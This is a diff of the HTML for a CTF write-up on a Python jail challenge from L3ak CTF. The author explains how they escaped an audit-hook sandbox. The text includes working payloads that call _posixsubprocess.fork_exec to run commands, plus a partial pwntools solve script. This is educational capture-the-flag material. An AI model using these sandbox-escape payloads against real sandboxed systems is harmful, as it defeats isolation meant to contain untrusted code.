@@ -91,7 +91,11 @@
 </div>
 
       <div class="content"><p>I partecipated to the first edition of <code>L3ak CTF</code> with <code>FoocHackz</code>. I solved this challenge, it wasn&rsquo;t hard but writing a working exploit took me at least one/two hours.</p>
-<h2 id="index">Index</h2>
+<h2 id="index">
+  <a class="full-clickable-heading" href="#index">
+    Index
+  </a>
+</h2>
 <ul>
 <li><a href="#index">Index</a></li>
 <li><a href="#overview">Overview</a>
@@ -110,14 +114,24 @@
 <li><a href="#considerations">Considerations</a></li>
 <li><a href="#source">Source</a></li>
 </ul>
-<h2 id="overview">Overview</h2>
+
+<h2 id="overview">
+  <a class="full-clickable-heading" href="#overview">
+    Overview
+  </a>
+</h2>
 <p>As the title of the challenge suggests, it&rsquo;s a pyjail. To be more precise, two challenges from two different CTFs were merged together</p>
 <ul>
 <li><code>obligatory pyjail</code> from <code>LIT CTF 2023</code></li>
 <li><code>PyMagic</code> from <code>TCP1P CTF 2023</code></li>
 </ul>
 <p>So, with that in mind, let&rsquo;s take a look at the source code</p>
-<h3 id="source">Source</h3>
+
+<h3 id="source">
+  <a class="full-clickable-heading" href="#source">
+    Source
+  </a>
+</h3>
 <p>We&rsquo;re given a bunch of files but these are the most important ones</p>
 <ul>
 <li><code>audit_sandbox.c</code> a C program which uses <a href="https://peps.python.org/pep-0578/">Audit Hooks</a> to implement a whitelist sandbox. The only audit events we&rsquo;re allowed to use are <code>compile</code> and <code>exec</code></li>
@@ -163,7 +177,12 @@
 <li>A cool gadget called <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code> is given to us</li>
 </ul>
 <p>If there had been <code>exec</code> instead of <code>eval</code>, we could have used <a href="https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-function-calls">decorators</a>!</p>
-<h3 id="a-bit-of-py-magic">A bit of Py-Magic</h3>
+
+<h3 id="a-bit-of-py-magic">
+  <a class="full-clickable-heading" href="#a-bit-of-py-magic">
+    A bit of Py-Magic
+  </a>
+</h3>
 <p>In this case, we can use a cool trick from the <code>PyMagic</code> challenge mentioned above</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call_function</span>(f, arg):
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[[None for _.__class_getitem__ in [</span><span style="color:#e6db74">{</span>f<span style="color:#e6db74">}</span><span style="color:#e6db74">]],&#34;</span>
@@ -176,13 +195,23 @@
 </span></span><span style="display:flex;"><span>    _[<span style="color:#e6db74">&#39;12&#39;</span>] <span style="color:#75715e"># Calling _.__class_getitem__ -&gt; int</span>
 </span></span><span style="display:flex;"><span>][<span style="color:#66d9ef">True</span>] <span style="color:#75715e"># Get the return value</span>
 </span></span></code></pre></div><p>But using this method, we have limitations: we are forced to pass only one argument to a function</p>
-<h3 id="obligatory-pyjail">Obligatory pyjail</h3>
+
+<h3 id="obligatory-pyjail">
+  <a class="full-clickable-heading" href="#obligatory-pyjail">
+    Obligatory pyjail
+  </a>
+</h3>
 <p>Ok now we need to bypass the audit sandbox. The file called <code>audit_sandbox.c</code> was actually <del>stolen</del> taken from <code>LIT CTF 2023</code></p>
 <p>Let&rsquo;s just take a look the solve for <code>obligatory pyjail</code> (Credits to flocto)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>[lm<span style="color:#f92672">:=</span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">104</span>]<span style="color:#f92672">.</span>load_module,p<span style="color:#f92672">:=</span>__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>pipe,_ps<span style="color:#f92672">:=</span>lm(<span style="color:#e6db74">&#34;_posixsubprocess&#34;</span>),_ps<span style="color:#f92672">.</span>fork_exec([<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt&#34;</span>], [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/cat&#34;</span>], <span style="color:#66d9ef">True</span>, (), <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">*</span>(p()), <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">None</span>)]
 </span></span></code></pre></div><p>So using <code>_posixsubprocess.fork_exec</code> we bypass that sandobx. Cool, but there&rsquo;s a catch: <code>fork_exec</code> requires exactly 21 arguments. As I said before, we&rsquo;re allowed to pass exactly 1 argument using <code>_.__class_getitem__</code></p>
 <p>And now what?</p>
-<h2 id="building-payloads-from-docs">Building payloads from docs</h2>
+
+<h2 id="building-payloads-from-docs">
+  <a class="full-clickable-heading" href="#building-payloads-from-docs">
+    Building payloads from docs
+  </a>
+</h2>
 <p>I specified earlier that <code>eval</code> is not completely deleted. In fact, we can access it from the <code>__main__</code> module. Since we can&rsquo;t import anything, we can reach the <code>sys</code> module from some objects found in <code>().__class__.__base__.__subclasses()</code> andd then access to <code>eval</code> using <code>sys.modules['__main__']</code></p>
 <p>But how can <code>eval</code> be useful to us?</p>
 <p>Our goal is to call <code>fork_exec</code> passing to it 21 arguments. We can build payloads from scratch using docs (eg. <code>[].__doc__</code>). If some characters are not in the docs, we can get them from <code>_.__qualname__</code></p>
@@ -193,7 +222,12 @@
 <li>Call it and pass the payload as the first argument</li>
 <li>Profit</li>
 </ul>
-<h2 id="solve">Solve</h2>
+
+<h2 id="solve">
+  <a class="full-clickable-heading" href="#solve">
+    Solve
+  </a>
+</h2>
 <p>I copy pasted the solve for <code>PyMagic</code>, you can find it <a href="https://github.com/SuperStormer/writeups/blob/master/tcp1pctf_2023/misc/pymagic/solve_pymagic.py">here</a> (Credits to SuperStormer)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -252,14 +286,29 @@
 <li>Build the payload which will be passed to <code>eval</code>: <code>[(os_module:=().__class__.__base__.__subclasses__()[137].__init__.__globals__).__class__,(sys:=os_module['sys']).__class__,sys.modules['_posixsubprocess'].fork_exec([f'.{47:c}readflag'.encode()],[f'.{47:c}readflag'.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module['pipe']()),False,False,None,None,None,-True,None)]</code></li>
 <li>Finally, pass that payload to <code>eval</code> and proceed to send everything to the remote server</li>
 </ul>
-<h3 id="flag">Flag</h3>
+
+<h3 id="flag">
+  <a class="full-clickable-heading" href="#flag">
+    Flag
+  </a>
+</h3>
 <p><code>L3AK{ok_so_os_wrap_close_works_with_builtin_removal_so_added_audit_sandbox_lol_689db2}</code></p>
-<h2 id="considerations">Considerations</h2>
+
+<h2 id="considerations">
+  <a class="full-clickable-heading" href="#considerations">
+    Considerations
+  </a>
+</h2>
 <p>This is not the intended solution. The author forgot to remove <code>eval</code> from the main module. I think the intended one is a lot smaller than mine.</p>
 <p>What happens if all modules from <code>sys.modules</code> are removed? Is it still solvable?</p>
 <p>At the end, it was a fun challenge to solve ❤️</p>
 <p>Thanks to the authors for the challenge and for the CTF in general. It&rsquo;s always nice to see pyjails in CTFs!</p>
-<h2 id="source-1">Source</h2>
+
+<h2 id="source-1">
+  <a class="full-clickable-heading" href="#source-1">
+    Source
+  </a>
+</h2>
 <p>You can find the source of this challenge <a href="https://github.com/salvatore-abello/pyjail/tree/main/L3ak%20CTF%202024">here</a></p>
 <p><strong>P.S:</strong> Do you need a cheatsheet with many tricks to solve pyjails? If so, <a href="https://github.com/salvatore-abello/python-ctf-cheatsheet/">click here!</a></p></div>
     </article>
